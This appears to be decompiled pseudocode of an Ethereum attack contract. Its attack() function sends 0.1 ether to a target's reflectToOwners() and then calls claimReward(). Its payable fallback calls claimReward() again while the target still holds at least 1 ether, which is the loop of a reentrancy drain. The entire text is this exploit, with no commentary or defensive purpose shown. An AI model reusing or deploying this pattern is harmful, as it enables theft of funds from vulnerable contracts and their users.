contract main {




// =====================  Runtime code  =====================


address targetAddress;
uint256 stor1;

function target() {
    return targetAddress
}

function _fallback() payable {
    if eth.balance(targetAddress) >= 10^18:
        require ext_code.size(targetAddress)
        call targetAddress.claimReward(uint256 arg1) with:
             gas gas_remaining wei
            args stor1
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
}

function attack() payable {
    require msg.value >= 10^17
    require ext_code.size(targetAddress)
    call targetAddress.reflectToOwners() with:
       value 10^17 wei
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require ext_code.size(targetAddress)
    call targetAddress.claimReward(uint256 arg1) with:
         gas gas_remaining wei
        args stor1
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
